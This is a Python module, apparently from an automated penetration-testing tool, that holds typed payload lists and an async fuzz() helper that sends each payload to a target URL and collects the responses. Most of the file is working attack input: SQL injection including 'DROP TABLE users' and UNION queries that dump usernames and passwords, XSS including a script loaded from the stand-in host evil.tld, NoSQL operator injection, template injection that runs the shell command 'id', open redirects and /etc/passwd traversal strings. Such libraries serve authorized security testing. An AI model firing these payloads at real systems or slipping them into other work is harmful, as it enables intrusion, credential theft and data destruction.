"""Typed payload library for probe fuzzing.

Each ptai probe historically sent ONE payload per shape. Real scanners
(sqlmap, dalfox, ffuf) try dozens of variants. This module is the missing
fuzzing primitive: an organized payload library plus a `fuzz()` helper
that walks a payload list against a URL template, with bounded
concurrency and a caller-supplied detection predicate.

Probes pick their list via `PAYLOAD_REGISTRY[bug_class]` so the registry
mirrors `engine.working_memory.BUG_CLASSES`.
"""
from __future__ import annotations

import asyncio
import logging
from collections.abc import Callable
from typing import Any
from urllib.parse import quote

import aiohttp

from engine.probes.primitives import http_get

logger = logging.getLogger("pentest-ai.probes.payloads")

_DEFAULT_TIMEOUT = aiohttp.ClientTimeout(total=8)
_BODY_SNIPPET = 512


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------
SQLI_PAYLOADS: tuple[str, ...] = (
    # UNION numeric
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT 1,2,3--",
    "-1 UNION SELECT username,password,3 FROM users--",
    # UNION string
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "\" UNION SELECT NULL,NULL--",
    # Boolean blind
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1--",
    "1 AND 1=2--",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    # Time-based
    "1' AND SLEEP(5)--",
    "1' AND (SELECT SLEEP(5))--",
    "1; SELECT pg_sleep(5)--",
    "1' AND pg_sleep(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1) WAITFOR DELAY '0:0:5'--",
    "1' || pg_sleep(5)||'",
    # Error-based
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    # Stacked
    "1; DROP TABLE users--",
    "1'; INSERT INTO users VALUES('x','y')--",
    # Comment variations
    "1'-- ",
    "1'#",
    "1'/**/OR/**/'1'='1",
    "1'/**/UNION/**/SELECT/**/NULL--",
)


# ---------------------------------------------------------------------------
# XSS
# ---------------------------------------------------------------------------
XSS_PAYLOADS: tuple[str, ...] = (
    # Tag-based <script>
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script src=//evil.tld/x.js></script>",
    "</script><script>alert(1)</script>",
    # <img onerror>
    "<img src=x onerror=alert(1)>",
    "<img src=1 onerror=\"alert('xss')\">",
    "<IMG SRC=x ONERROR=alert(1)>",
    # <svg onload>
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    # javascript: URI
    "javascript:alert(1)",
    "javascript:alert('xss')",
    "JaVaScRiPt:alert(1)",
    # Event handlers
    "\" onclick=alert(1) x=\"",
    "' onmouseover='alert(1)",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    # DOM-XSS via fragment
    "#<script>alert(1)</script>",
    "#javascript:alert(1)",
    # Encoded variants
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<iframe src=javascript:alert(1)>",
)


# ---------------------------------------------------------------------------
# NoSQL Injection (MongoDB / CouchDB)
# ---------------------------------------------------------------------------
NOSQL_PAYLOADS: tuple[str, ...] = (
    # Operator injection in query strings
    "[$ne]=1",
    "[$ne]=null",
    "[$gt]=",
    "[$gt]=0",
    "[$lt]=999999",
    "[$regex]=.*",
    "[$regex]=^a",
    "[$exists]=true",
    "[$where]=1==1",
    "[$where]=sleep(5000)",
    "[$where]=this.password.match(/.*/)",
    # JSON-shape payloads (sent as values; consumers may JSON-encode)
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "sleep(5000)"}',
    # CouchDB-style _all_docs / view tampering
    "../_all_docs",
    "_design/_view/all",
)


# ---------------------------------------------------------------------------
# Server-Side Template Injection
# ---------------------------------------------------------------------------
SSTI_PAYLOADS: tuple[str, ...] = (
    # Jinja2 / Twig
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    # Twig-specific
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # ERB (Ruby)
    "<%= 7*7 %>",
    "<%= system('id') %>",
    # Handlebars / Mustache
    "{{#with this}}{{this}}{{/with}}",
    "{{this.constructor.constructor('return process')()}}",
    # Velocity (Java)
    "#set($x=7*7)$x",
    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
    # Smarty / FreeMarker
    "{php}echo `id`;{/php}",
    "<#assign x=\"freemarker.template.utility.Execute\"?new()> ${x(\"id\")}",
)


# ---------------------------------------------------------------------------
# Open Redirect
# ---------------------------------------------------------------------------
OPEN_REDIRECT_PAYLOADS: tuple[str, ...] = (
    # Scheme confusion / protocol-relative
    "//attacker.tld",
    "//attacker.tld/",
    "///attacker.tld",
    "////attacker.tld",
    "\\\\attacker.tld",
    "/\\attacker.tld",
    # Backslash and whitespace tricks
    "/\\/attacker.tld",
    " //attacker.tld",
    # Embedded credentials
    "https://legit.tld@attacker.tld",
    "//legit.tld@attacker.tld",
    # Dangerous schemes
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(1)",
    # IP as integer / hex
    "//2130706433",  # 127.0.0.1 as int
    "//0x7f000001",
    # IDN / punycode homograph
    "//аttacker.tld",  # cyrillic 'a'
    "//xn--ttacker-1ub.tld",
)


# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------
PATH_TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    # Classic
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Encoded
    "..%2fetc%2fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    # Double-encoded
    "..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    # Doubled / mixed
    "....//etc/passwd",
    "....//....//etc/passwd",
    "..././..././etc/passwd",
    # Null byte
    "../etc/passwd%00",
    "../etc/passwd%00.png",
    # Backslash (Windows)
    "..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "%5c..%5c..%5cwindows%5cwin.ini",
    # UNC / absolute
    "\\\\attacker.tld\\share",
    "/etc/passwd",
)


# ---------------------------------------------------------------------------
# Registry: bug_class -> payload list
# ---------------------------------------------------------------------------
PAYLOAD_REGISTRY: dict[str, tuple[str, ...]] = {
    "sqli": SQLI_PAYLOADS,
    "xss_reflected": XSS_PAYLOADS,
    "xss_stored": XSS_PAYLOADS,
    "nosql_injection": NOSQL_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "rce_template": SSTI_PAYLOADS,
    "open_redirect": OPEN_REDIRECT_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
}


# Detection predicate: (status, headers, body, baseline_body) -> bool
DetectFn = Callable[[int, dict[str, str], str, str], bool]


async def fuzz(
    session: aiohttp.ClientSession,
    url_template: str,
    payload_list: tuple[str, ...] | list[str],
    detect_fn: DetectFn,
    *,
    baseline_url: str | None = None,
    concurrency: int = 8,
    timeout: aiohttp.ClientTimeout | None = None,
    headers: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Fuzz a URL template with each payload, run detect_fn, aggregate.

    `url_template` must contain `{payload}` which gets URL-encoded and
    substituted per attempt. A single baseline GET is performed against
    `baseline_url` (or the un-payloaded template) and reused for every
    detection call. Concurrency is bounded; per-attempt timeout is
    bounded. Errors return as `hit=False` rows so the caller still sees
    the attempt.

    Returns a list of dicts: {payload, status, body_size, body_snippet, hit}.
    """
    if "{payload}" not in url_template:
        raise ValueError("url_template must contain '{payload}' placeholder")

    bl_url = baseline_url or url_template.replace("{payload}", "")
    bl_timeout = timeout or _DEFAULT_TIMEOUT
    _, _, baseline_body = await http_get(
        session, bl_url, headers=headers, timeout=bl_timeout
    )

    sem = asyncio.Semaphore(concurrency)

    async def attempt(payload: str) -> dict[str, Any]:
        url = url_template.replace("{payload}", quote(payload, safe=""))
        async with sem:
            status, hdrs, body = await http_get(
                session, url, headers=headers, timeout=bl_timeout
            )
        try:
            hit = bool(detect_fn(status, hdrs, body, baseline_body))
        except Exception as exc:  # noqa: BLE001
            logger.debug("detect_fn raised on payload %r: %s", payload, exc)
            hit = False
        return {
            "payload": payload,
            "status": status,
            "body_size": len(body),
            "body_snippet": body[:_BODY_SNIPPET],
            "hit": hit,
        }

    results = await asyncio.gather(*(attempt(p) for p in payload_list))
    return list(results)
